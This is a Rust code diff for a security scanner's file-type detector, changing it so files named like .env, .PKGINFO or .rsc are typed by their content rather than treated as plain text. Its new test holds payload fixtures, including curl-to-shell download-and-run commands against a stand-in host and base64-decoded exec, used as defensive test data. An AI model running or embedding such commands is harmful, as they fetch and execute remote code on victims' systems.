@@ -365,24 +365,27 @@ pub(crate) fn detect_file_type_from_detected(
     file_data: &[u8],
     detected: Option<FileType>,
 ) -> FileType {
+    // A name like `.env`, `.PKGINFO` or `*.rsc` says "inert text", and the
+    // caller chooses the name: letting it outrank the bytes would let a script
+    // saved as `.env` — or an ELF, or a zip — be read as text. So for those
+    // names the bytes are asked alone, and code, binaries and archives are
+    // typed by what they are; content nothing recognizes keeps the name's type.
+    let inert_name = is_dotenv_name(file_path)
+        || is_arch_package_metadata_name(file_path)
+        || is_routeros_script_name(file_path);
+    let detected = inert_name
+        .then(|| filefacts::fileid::detect(Path::new("content"), file_data))
+        .flatten()
+        .map(|d| d.file_type)
+        .filter(|ft| ft.is_source_code() || ft.is_binary() || ft.is_archive())
+        .or(detected);
     let detected = detected
         .filter(|ft| *ft != FileType::Pe || looks_like_pe_image(file_data))
         .filter(|ft| *ft != FileType::Unknown);
 
-    // The name-based text overrides apply only to content that is not a
-    // compiled binary or an archive: otherwise naming an ELF or a zip `.env`
-    // would skip binary and member analysis entirely.
-    let opaque = detected.is_some_and(|ft| ft.is_binary() || ft.is_archive());
-    if !opaque
-        && (is_dotenv_name(file_path)
-            || is_arch_package_metadata_name(file_path)
-            || is_routeros_script_name(file_path))
-    {
-        return FileType::Text;
-    }
-
     detected
         .or_else(|| sniff_script_type_from_content(file_data))
+        .or_else(|| inert_name.then_some(FileType::Text))
         .or_else(|| known_manifest_type_from_basename(file_path))
         .or_else(|| known_data_type_from_extension(file_path))
         .unwrap_or(FileType::Unknown)
@@ -1230,6 +1233,30 @@ mod tests {
             detect_file_type_from_data(Path::new(".env"), b"API_KEY=abc123\n"),
             FileType::Text
         );
+    }
+
+    /// A name that means "inert text" is the caller's to choose, so it must
+    /// not hide code: a payload named `.env`, `.PKGINFO` or `x.rsc` is typed
+    /// by its content, exactly as it would be under any other name.
+    #[test]
+    fn scripts_named_like_text_keep_their_content_type() {
+        let js = b"const cp = require('child_process');\ncp.execSync('curl http://x.example | sh');\nmodule.exports = {};\n";
+        let py = b"import os, base64\nexec(base64.b64decode('cHJpbnQoMSk='))\n";
+        let sh = b"#!/bin/sh\ncurl -s http://x.example | sh\n";
+        for name in [".env", ".env.backup", ".PKGINFO", ".BUILDINFO", ".MTREE", "setup.rsc"] {
+            for (payload, expected) in [
+                (js.as_slice(), detect_file_type_from_data(Path::new("plain"), js)),
+                (py.as_slice(), detect_file_type_from_data(Path::new("plain"), py)),
+                (sh.as_slice(), detect_file_type_from_data(Path::new("plain"), sh)),
+            ] {
+                assert_ne!(expected, FileType::Text);
+                assert_eq!(
+                    detect_file_type_from_data(Path::new(name), payload),
+                    expected,
+                    "payload named {name}"
+                );
+            }
+        }
     }
 
     #[test]
